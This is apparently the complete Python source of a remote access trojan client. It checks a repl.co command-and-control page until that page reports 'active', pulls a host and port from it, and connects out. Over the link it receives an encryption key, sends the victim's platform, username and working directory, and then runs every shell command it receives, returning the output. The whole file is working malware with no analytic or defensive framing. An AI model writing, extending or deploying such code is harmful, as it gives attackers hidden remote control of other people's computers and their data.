import os
import socket
from random import choice
import subprocess
import json
import platform
import threading
import requests
from cryptography.fernet import Fernet

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890!@#$%^&*()"

while not requests.get("https://rat-app-yay.ryderretzlaff.repl.co/").text == "active":
    pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = requests.get("https://rat-app-yay.ryderretzlaff.repl.co/ip/").text
port = int(requests.get("https://rat-app-yay.ryderretzlaff.repl.co/port/").text)

s.connect((host, port))

encryption = False

def new_salt():
    salt = ""
    for x in range(15):
        salt += choice(chars)
    return salt

def send_raw(content_type, Bytes_, salt=new_salt()):
    seperator = "<|SEPERATE|>"
    to_send = content_type + seperator + Bytes_.decode() + seperator + salt
    to_send = to_send.encode()
    if encryption:
        to_send = Fernet(key).encrypt(to_send)
    s.send(to_send)

def recv_raw(BufferSize):
    seperator = "<|SEPERATE|>".encode()
    data = b""
    while True:
        data = s.recv(BufferSize)
        if data: break
    if encryption:
        data = Fernet(key).decrypt(data)
    splitted = data.decode().split(seperator.decode())
    content_type = splitted[0]
    Bytes_ = splitted[1].encode()
    salt = splitted[2]
    return {"content_type": content_type, "bytes": Bytes_}

key = recv_raw(1024)["bytes"]
send_raw("key_confirm", key)
encryption = True
sys_info = {}
sys_info["platform"] = platform.platform()
sys_info["architecture"] = platform.architecture()
sys_info["username"] = os.getlogin()
sys_info["current_dir"] = os.getcwd()
send_raw("sys_info", json.dumps(sys_info).encode())
while True:
    #listen for commands
    data = recv_raw(1024)

    def run_command():
        cmd = data["bytes"].decode()
        output = subprocess.getoutput(cmd)
        if cmd[:3] == "cd ":
            os.chdir(cmd[3:])
        send_raw("command_output", output.encode())

    if data["content_type"] == "abort":
        s.close()
        break
    elif data["content_type"] == "command":
        #run the command and send the output
        #run in a new thread
        threading.Thread(target=run_command).start()
